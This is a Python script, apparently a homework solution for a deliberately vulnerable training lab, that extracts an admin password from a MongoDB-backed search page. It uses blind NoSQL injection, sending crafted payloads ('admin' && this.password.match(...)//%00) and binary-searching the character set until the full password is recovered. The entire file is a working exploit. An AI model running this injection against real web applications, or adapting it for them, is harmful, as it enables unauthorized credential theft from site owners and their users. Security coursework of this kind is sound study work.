import sys
import requests
import re
import math

def search_url(url_name):
    """ Find password
    
    Using brute force binary checking
    
    Parameters: 
    url_name (string): url to be tested
    code will append pattern matching to the url
    
    Returns: password (string): found password
    
    """
    
    #range of valid characters, with speical terminating character: @
    test = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@'
    result = ''
    found = test
    
    while found != '@':
        found = test
        while len(found) != 1:
            # split the range
            half = len(found) / 2
            math.ceil(half)
            Half = int(half)
            
            #check the first half of the range
            j = requests.get(url_name + "?search=admin%27%20%26%26%20this.password.match(/^" + result + "[" + found[:Half] + "].*/)//+%00")
            
            if(j.text.find("admin") != -1):
                print('Yes')
                found = found[:Half]
            else:
                print('No')
                found = found[Half:]
                
            # check if found is one character
            if 1 == len(found):
                #check if character is terminating character
                if found == '@':
                    return result
                print('\tPassword = ' + result + found + ' ...')
                result = result + found
        
                
    return result


def main():
    if len(sys.argv) != 2:
        print ('usage: ./hw1.py <wfp2_site> .eg python3 hw1.py localhost:8000')
        sys.exit(1)
    
    url_name = sys.argv[1]
    url_name = 'http://' + url_name + '/mongodb/example2/'
    
    password = search_url(url_name)
    print('Password = ' + password)
    
    sys.exit(1)
    
if __name__ == '__main__':
    main()

